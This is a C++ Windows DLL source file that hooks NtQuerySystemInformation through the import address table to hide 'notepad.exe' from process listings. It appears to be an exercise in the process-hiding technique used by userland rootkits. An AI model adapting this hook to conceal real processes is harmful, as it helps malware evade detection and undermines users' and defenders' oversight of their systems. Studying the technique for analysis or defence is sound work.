// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include <iostream>
#include "pch.h"
#include "framework.h"
#include "tchar.h"

#define STATUS_SUCCESS						(0x00000000L) 
#define DEF_NTDLL ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")

using PrototypeZwQuerySystemInformation = NTSTATUS (WINAPI*)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
													PVOID                    SystemInformation,
													ULONG                    SystemInformationLength,
													PULONG                   ReturnLength);

PrototypeZwQuerySystemInformation originalNtQuerySystemInformation = (PrototypeZwQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"),"ZwQuerySystemInformation");

int hookedZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
									PVOID                    SystemInformation,
									ULONG                    SystemInformationLength,
									PULONG                   ReturnLength)
{
	NTSTATUS status = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev{ 0, };

	if ((status == STATUS_SUCCESS) && (SystemInformationClass == SystemProcessInformation))
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE)
		{
			if (pCur->ImageName.Buffer != NULL)
			{
				if (!_tcsicmp((PWSTR)pCur->ImageName.Buffer, L"notepad.exe"))
				{
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			}
			if (pCur->NextEntryOffset == 0)
				break;
			pCur = (PSYSTEM_PROCESS_INFORMATION)((UINT_PTR)pCur + pCur->NextEntryOffset);
		}
	}

	return status;
}



BOOL IAT_Hook()
{
	LPVOID imageBase = GetModuleHandleA(NULL);
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)imageBase + dosHeaders->e_lfanew);
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (UINT_PTR)imageBase);

	LPCSTR libraryName = NULL;
	HMODULE library = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (UINT_PTR)imageBase;
		library = LoadLibraryA(libraryName);
		std::string name = libraryName;
		if (name == "ntdll.dll")
		{
			if (library)
			{
				PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
				originalFirstThunk = (PIMAGE_THUNK_DATA)((UINT_PTR)imageBase + importDescriptor->OriginalFirstThunk);
				firstThunk = (PIMAGE_THUNK_DATA)((UINT_PTR)imageBase + importDescriptor->FirstThunk);

				while (originalFirstThunk->u1.AddressOfData != NULL)
				{
					functionName = (PIMAGE_IMPORT_BY_NAME)((UINT_PTR)imageBase + originalFirstThunk->u1.AddressOfData);

					if (std::string(functionName->Name).compare("NtQuerySystemInformation") == 0)
					{
						SIZE_T bytesWritten = 0;
						DWORD oldProtect = 0;
						VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);

						firstThunk->u1.Function = (UINT_PTR)hookedZwQuerySystemInformation;
						OutputDebugString(L"Hook Ok");
					}
					++originalFirstThunk;
					++firstThunk;
				}
			}
		}
		// 증가
		importDescriptor++;
	}
	return TRUE;
}

BOOL IAT_UnHook()
{
	LPVOID imageBase = GetModuleHandleA(NULL);
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)imageBase + dosHeaders->e_lfanew);
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (UINT_PTR)imageBase);

	LPCSTR libraryName = NULL;
	HMODULE library = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (UINT_PTR)imageBase;
		library = LoadLibraryA(libraryName);

		std::string name = libraryName;
		if (name == "ntdll.dll")
		{
			if (library)
			{
				PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
				originalFirstThunk = (PIMAGE_THUNK_DATA)((UINT_PTR)imageBase + importDescriptor->OriginalFirstThunk);
				firstThunk = (PIMAGE_THUNK_DATA)((UINT_PTR)imageBase + importDescriptor->FirstThunk);

				while (originalFirstThunk->u1.AddressOfData != NULL)
				{
					functionName = (PIMAGE_IMPORT_BY_NAME)((UINT_PTR)imageBase + originalFirstThunk->u1.AddressOfData);

					if (std::string(functionName->Name).compare("NtQuerySystemInformation") == 0)
					{
						SIZE_T bytesWritten = 0;
						DWORD oldProtect = 0;
						VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_EXECUTE_READWRITE, &oldProtect);

						firstThunk->u1.Function = (UINT_PTR)originalNtQuerySystemInformation;
					}
					++originalFirstThunk;
					++firstThunk;
				}
			}
		}
		// 증가
		importDescriptor++;
	}
	return TRUE;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		OutputDebugString(L"start");
		IAT_Hook();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
		OutputDebugString(L"end");
		IAT_UnHook();
        break;
    }
    return TRUE;
}

